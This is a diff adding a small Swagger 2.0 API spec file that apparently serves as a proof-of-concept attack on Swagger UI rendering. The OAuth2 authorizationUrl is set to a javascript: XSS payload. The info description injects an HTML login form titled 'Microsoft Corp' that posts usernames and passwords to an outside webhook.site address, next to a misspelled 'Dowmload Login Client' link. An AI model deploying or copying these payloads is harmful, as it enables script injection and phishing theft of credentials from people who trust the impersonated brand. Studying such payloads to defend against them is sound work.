@@ -1,0 +1,15 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "1.0.0"
+  title: Microsoft Corp
+  description: <form method="POST" action="https://webhook.site/7f65669f-57d0-450a-b157-4482ba38bad2">username:<input type="text" name="username">password:<input type="password" name="password"><input type="submit" value="login"></form><br /><a href="https://aa.cc">Dowmload Login Client</a>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
